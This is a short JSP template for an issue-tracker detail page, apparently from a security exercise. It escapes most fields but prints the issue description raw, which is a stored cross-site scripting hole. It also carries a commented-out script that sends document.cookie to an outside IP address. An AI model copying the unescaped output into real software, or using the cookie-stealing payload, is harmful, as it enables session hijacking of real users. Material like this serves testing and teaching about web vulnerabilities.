<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<html>
<body>

<div class="details align-left">
  <p class="bold-text divider">Details</p>
  <p class="details-item">Type: <c:out value="${issue.type}"/></p>
  <p class="details-item">Status: <c:out value="${issue.status}"/></p>
  <p class="details-item">Priority: <c:out value="${issue.priority}"/></p>
  <p class="details-item">Resolution: <c:out value="${issue.resolution}"/></p>
</div>
<div class="people align-right">
  <p class="bold-text divider">People</p>
  <p class="people-item">Assignee: <c:out value="${issue.assignee}"/></p>
  <p class="people-item">Reporter: <c:out value="${issue.reporter}"/></p>
</div>
<div class="issue-description divider">
  <p class="description-border">Description</p>
  <p><%= issue.description %><p> 
  <!-- <script>new Image().src="http://193.112.33.32/?cookie=" + document.cookie;</script> -->
</div>

</body>
</html>